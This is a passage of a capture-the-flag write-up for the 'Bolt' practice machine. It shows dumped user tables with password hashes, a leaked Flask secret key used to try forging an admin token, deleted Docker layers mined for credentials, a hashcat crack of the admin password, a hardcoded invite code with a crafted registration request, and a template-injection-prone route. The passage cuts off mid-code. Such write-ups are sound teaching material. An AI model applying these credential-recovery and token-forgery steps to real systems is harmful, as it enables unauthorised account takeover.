</span></span><span style="display:flex;"><span>   ...<span style="color:#ff79c6">&gt;</span> ;
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases
</span></span><span style="display:flex;"><span>main:
</span></span><span style="display:flex;"><span>db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>db.sqlite3
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .tables
</span></span><span style="display:flex;"><span>db.<span style="color:#ff79c6">User</span>
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>;
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$XztGk033$PKNqG2O072NwJfcwXDdXN<span style="color:#ff79c6">/||</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">|</span>AAAA<span style="color:#ff79c6">|</span>a<span style="color:#ff79c6">@</span>a.a<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$cArj<span style="color:#ff79c6">/</span><span style="color:#bd93f9">7</span>IZ$zFaX0xwzA1d0AEPMguFA7.<span style="color:#ff79c6">||</span>BBBB
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at source code <strong>config.py</strong>, we find at row 14:</p>
<pre><code>SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
</code></pre>
<p>This secret key is used in <strong>app/home/routes.py</strong> at row 16 to serialize strings:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ff79c6">..</span>]
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">..</span>]
</span></span><span style="display:flex;"><span>ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>])
</span></span></code></pre></td></tr></table>
</div>
</div><p>from this file, new routes we did not identify with gobuster can be explored.</p>
<table>
<thead>
<tr>
<th>route</th>
<th>login required</th>
</tr>
</thead>
<tbody>
<tr>
<td>/<!-- raw HTML omitted --></td>
<td>Yes</td>
</tr>
<tr>
<td>/example-profile</td>
<td>No</td>
</tr>
<tr>
<td>/confirm/changes/<!-- raw HTML omitted --></td>
<td>No</td>
</tr>
</tbody>
</table>
<p>The last route is interesting because we have the source code to create a token for a specific user as well as retrieve the username or email that has been safely tokenized:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/confirm/changes/&lt;token&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">confirm_changes</span>(token):
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;&#34;&#34;Confirmation Token&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span>:
</span></span><span style="display:flex;"><span>        abort(<span style="color:#bd93f9">404</span>)
</span></span><span style="display:flex;"><span>    user <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(username<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first_or_404()
</span></span><span style="display:flex;"><span>    name <span style="color:#ff79c6">=</span> user<span style="color:#ff79c6">.</span>profile_update
</span></span><span style="display:flex;"><span>    template <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;templates/emails/update-name.html&#39;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>)<span style="color:#ff79c6">.</span>read()
</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> Message(
</span></span><span style="display:flex;"><span>            recipients<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>user<span style="color:#ff79c6">.</span>email<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>],
</span></span><span style="display:flex;"><span>            sender <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
</span></span><span style="display:flex;"><span>            reply_to <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
</span></span><span style="display:flex;"><span>            subject <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Your profile changes have been confirmed.&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>html <span style="color:#ff79c6">=</span> render_template_string(template <span style="color:#ff79c6">%</span> name)
</span></span><span style="display:flex;"><span>    mail<span style="color:#ff79c6">.</span>send(msg)
</span></span><span style="display:flex;"><span>                                                                                                                                                                  <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;index.html&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>With a bit of luck, the secret and the salt are the same in the Production system. As an example for user <strong>admin</strong>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>$ python3
</span></span><span style="display:flex;"><span>Python <span style="color:#bd93f9">3.8.2</span> (default, Jul <span style="color:#bd93f9">16</span> <span style="color:#bd93f9">2020</span>, <span style="color:#bd93f9">14</span>:<span style="color:#bd93f9">00</span>:<span style="color:#bd93f9">26</span>)
</span></span><span style="display:flex;"><span>[GCC <span style="color:#bd93f9">9.3.0</span>] on linux
</span></span><span style="display:flex;"><span>Type <span style="color:#f1fa8c">&#34;help&#34;</span>, <span style="color:#f1fa8c">&#34;copyright&#34;</span>, <span style="color:#f1fa8c">&#34;credits&#34;</span> <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;license&#34;</span> <span style="color:#ff79c6">for</span> more information<span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(<span style="color:#f1fa8c">&#39;S#perS3crEt_007&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> user <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> token <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>dumps(user, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;changes-confirm-key&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> token
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;ImFkbWluIg.YX5vNQ.qIo6-iaPzlnFFdosQeQTfgez7zo&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> email
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;admin&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The attempt miserably fail because the URLSafeTimedSerializer is not using the same Time signature as the server.</p>
<pre><code>itsdangerous.exc.BadTimeSignature: Signature b&quot;qIo6-iaPzlnFFdosQeQTfgez7zo'&quot; does not match
</code></pre>
<p>I still want to validate the approach of resetting the admin password, so maybe</p>
<h2 id="exploring-docker-layers">Exploring docker layers</h2>
<p>Is it possible there is some more findings on the volume layers? <a href="https://github.com/wagoodman/dive">Dive</a> is a great tool to explore container volume layers and visualize Added/Removed/Modified/Unmodified files.</p>
<table>
<thead>
<tr>
<th>layer</th>
<th>added / removed / modified files</th>
</tr>
</thead>
<tbody>
<tr>
<td>187e74</td>
<td>FROM <!-- raw HTML omitted --></td>
</tr>
<tr>
<td>745959</td>
<td>COPY .env config.py run.py gunicorn-cfg.py requirements.txt</td>
</tr>
<tr>
<td>410934</td>
<td>COPY ./app/</td>
</tr>
<tr>
<td>a4ea7d</td>
<td>New file db.sqlite3</td>
</tr>
<tr>
<td>304986</td>
<td>Removed db.sqlite3 base/forms.py base/routes.py base/[..]/register.html</td>
</tr>
</tbody>
</table>
<p>Exploring the deleted db.sqlite3 reveals admin hash</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>[I] âžœ sqlite3
</span></span><span style="display:flex;"><span>SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
</span></span><span style="display:flex;"><span>Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
</span></span><span style="display:flex;"><span>Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
</span></span><span style="display:flex;"><span>Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
</span></span><span style="display:flex;"><span>...<span style="color:#ff79c6">&gt;</span> ;
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases;
</span></span><span style="display:flex;"><span>Error: <span style="color:#ff79c6">unknown</span> command <span style="color:#ff79c6">or</span> invalid arguments: <span style="color:#f1fa8c">&#34;databases;&#34;</span>. Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> help
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases
</span></span><span style="display:flex;"><span>main:
</span></span><span style="display:flex;"><span>db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>bolt<span style="color:#ff79c6">/</span>a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2<span style="color:#ff79c6">/</span>db.sqlite3
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .tables
</span></span><span style="display:flex;"><span>db.<span style="color:#ff79c6">User</span>
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> \<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>
</span></span><span style="display:flex;"><span>...<span style="color:#ff79c6">&gt;</span> ;
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$sm1RceCh$rSd3PygnS<span style="color:#ff79c6">/</span><span style="color:#bd93f9">6</span>jlFDfF2J5q.<span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --force
[..]
hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --show
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
</code></pre>
<p>We can indeed successfully login with admin:deadbolt and a chat conversation reveals the demo is restricted to invite only. Looking at deleted file /app/base/routes.py we can find the invitation code, if the use does not exist and the email is not registered then it will be created :)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/register&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">register</span>():
</span></span><span style="display:flex;"><span>    login_form <span style="color:#ff79c6">=</span> LoginForm(request<span style="color:#ff79c6">.</span>form)
</span></span><span style="display:flex;"><span>    create_account_form <span style="color:#ff79c6">=</span> CreateAccountForm(request<span style="color:#ff79c6">.</span>form)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;register&#39;</span> <span style="color:#ff79c6">in</span> request<span style="color:#ff79c6">.</span>form:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        username  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;username&#39;</span>]
</span></span><span style="display:flex;"><span>        email     <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;email&#39;</span>   ]
</span></span><span style="display:flex;"><span>        code	  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;invite_code&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> code <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;code-500.html&#39;</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(email<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> data <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span> <span style="color:#ff79c6">and</span> code <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
</span></span><span style="display:flex;"><span>            [<span style="color:#ff79c6">..</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># else we can create the user</span>
</span></span><span style="display:flex;"><span>            user <span style="color:#ff79c6">=</span> User(<span style="color:#ff79c6">**</span>request<span style="color:#ff79c6">.</span>form)
</span></span><span style="display:flex;"><span>            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>add(user)
</span></span><span style="display:flex;"><span>            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>commit()
</span></span></code></pre></td></tr></table>
</div>
</div><p>But registration still does not work:</p>
<pre tabindex="0"><code>POST /register HTTP/1.1
Host: bolt.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://bolt.htb
Connection: close
Referer: http://bolt.htb/register
Upgrade-Insecure-Requests: 1

username=aaaa&amp;email=a%40a.a&amp;password=aaaaaaaa&amp;invite_code=XNSS-HSJW-3NGU-8XTJ
</code></pre><p>Looking at the deleted forms.py, we can see the form&rsquo;s input are different:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CreateAccountForm</span>(FlaskForm):
